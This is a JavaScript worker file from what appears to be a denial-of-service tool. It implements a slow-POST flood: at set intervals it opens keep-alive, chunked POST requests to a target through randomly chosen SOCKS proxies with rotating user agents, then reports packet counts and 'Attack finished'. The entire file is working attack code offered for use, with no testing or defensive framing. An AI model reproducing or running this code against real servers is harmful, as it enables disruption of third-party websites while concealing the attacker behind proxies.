import http from "http";
import { SocksProxyAgent } from "socks-proxy-agent";
import { parentPort, workerData } from "worker_threads";

import { randomString } from "../utils/randomUtils.js";

const startAttack = () => {
  const { target, proxies, userAgents, duration, packetDelay, packetSize } =
    workerData;

  const fixedTarget = target.startsWith("http") ? target : `http://${target}`;
  const protocolPort = target.startsWith("https") ? 443 : 80;
  const targetPort = fixedTarget.includes(":")
    ? parseInt(fixedTarget.split(":")[2])
    : protocolPort;
  const targetHost = fixedTarget.replace(/^https?:\/\//, "");

  let totalPackets = 0;
  const startTime = Date.now();

  const sendRequest = async (proxy, userAgent) => {
    const options = {
      hostname: targetHost,
      port: targetPort,
      path: "/",
      method: "POST",
      headers: {
        "User-Agent": userAgent,
        Connection: "keep-alive",
        "Transfer-Encoding": "chunked",
        Host: targetHost,
      },
      agent: new SocksProxyAgent(
        `${proxy.protocol}://${proxy.username && proxy.password ? `${proxy.username}:${proxy.password}@` : ""}${proxy.host}:${proxy.port}`
      ),
    };

    const req = http.request(options, (res) => {
      res.on("data", () => {});
      res.on("end", () => {});
    });

    req.on("error", (err) => {
      parentPort.postMessage({
        log: `❌ Request failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${err.message}`,
        totalPackets,
      });
    });

    req.on("close", () => {
      parentPort.postMessage({
        log: `⚠ Connection closed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
        totalPackets,
      });
    });

    const payload = randomString(packetSize);
    req.write(payload);

    totalPackets++;
    parentPort.postMessage({
      log: `✅ Request sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
      totalPackets,
    });
  };

  const interval = setInterval(() => {
    const elapsedTime = (Date.now() - startTime) / 1000;

    if (elapsedTime >= duration) {
      clearInterval(interval);
      parentPort.postMessage({ log: "Attack finished", totalPackets });
      process.exit(0);
    }

    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    sendRequest(proxy, userAgent);
  }, packetDelay);
};

if (workerData) {
  startAttack();
}
